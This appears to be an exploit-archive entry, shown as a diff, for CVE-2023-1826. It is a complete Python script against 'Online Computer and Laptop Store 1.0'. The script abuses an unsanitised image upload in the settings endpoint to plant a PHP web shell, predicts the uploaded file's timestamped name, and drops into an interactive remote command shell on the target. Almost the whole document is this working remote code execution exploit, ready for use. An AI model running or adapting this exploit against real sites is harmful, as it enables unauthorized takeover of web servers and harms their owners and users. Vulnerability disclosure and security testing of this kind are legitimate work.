@@ -1,0 +1,88 @@
+id: 38578
+date: 04/10/2023
+title: Online Computer and Laptop Store 1.0 - Remote Code Execution Exploit
+author: Matisse Beckandt
+cves: CVE-2023-1826
+
+#!/usr/bin/env python3
+
+# Exploit Title: Online Computer and Laptop Store 1.0 - Remote Code Execution (RCE)
+# Date: 09/04/2023
+# Exploit Author: Matisse Beckandt (Backendt)
+# Vendor Homepage: https://www.sourcecodester.com/php/16397/online-computer-and-laptop-store-using-php-and-mysql-source-code-free-download.html
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/php-ocls.zip
+# Version: 1.0
+# Tested on: Debian 11.6
+# CVE : CVE-2023-1826
+
+# Exploit Description : The application does not sanitize the 'img' parameter when sending data to '/classes/SystemSettings.php?f=update_settings'. An attacker can exploit this issue by uploading a PHP file and accessing it, leading to Remote Code Execution.
+import requests
+from argparse import ArgumentParser
+from uuid import uuid4
+from datetime import datetime, timezone
+
+def interactiveShell(fileUrl: str):
+    print("Entering pseudo-shell. Type 'exit' to quit")
+    while True:
+        command = input("\n$ ")
+        if command == "exit":
+            break
+
+        response = requests.get(f"{fileUrl}?cmd={command}")
+        print(response.text)
+
+def uploadFile(url: str, filename: str, content):
+    endpoint = f"{url}/classes/SystemSettings.php?f=update_settings"
+    file = {"img": (filename, content)}
+
+    response = requests.post(endpoint, files=file)
+    return response
+
+def getUploadedFileUrl(url: str, filename: str):
+    timeNow = datetime.now(timezone.utc).replace(second=0) # UTC time, rounded to minutes
+    epoch = int(timeNow.timestamp()) # Time in milliseconds
+    possibleFilename = f"{epoch}_{filename}"
+    fileUrl = f"{url}/uploads/{possibleFilename}"
+    response = requests.get(fileUrl)
+    if response.status_code == 200:
+        return fileUrl
+
+def exploit(url: str):
+    filename = str(uuid4()) + ".php"
+    content = "<?php system($_GET['cmd'])?>"
+    response = uploadFile(url, filename, content)
+
+    if response.status_code != 200:
+        print(f"[File Upload] Got status code {response.status_code}. Expected 200.")
+
+    uploadedUrl = getUploadedFileUrl(url, filename)
+    if uploadedUrl == None:
+        print("Error. Could not find the uploaded file.")
+        exit(1)
+    print(f"Uploaded file is at {uploadedUrl}")
+
+    try:
+        interactiveShell(uploadedUrl)
+    except KeyboardInterrupt:
+        pass
+    print("\nQuitting.")
+
+def getWebsiteURL(url: str):
+    if not url.startswith("http"):
+        url = "http://" + url
+    if url.endswith("/"):
+        url = url[:-1]
+    return url
+
+def main():
+    parser = ArgumentParser(description="Exploit for CVE-2023-1826")
+    parser.add_argument("url", type=str, help="The url to the application's installation. Example: http://mysite:8080/php-ocls/")
+    args = parser.parse_args()
+
+    url = getWebsiteURL(args.url)
+    exploit(url)
+
+if __name__ == "__main__":
+    main()
+
+#  0day.today [2023-04-19]  #
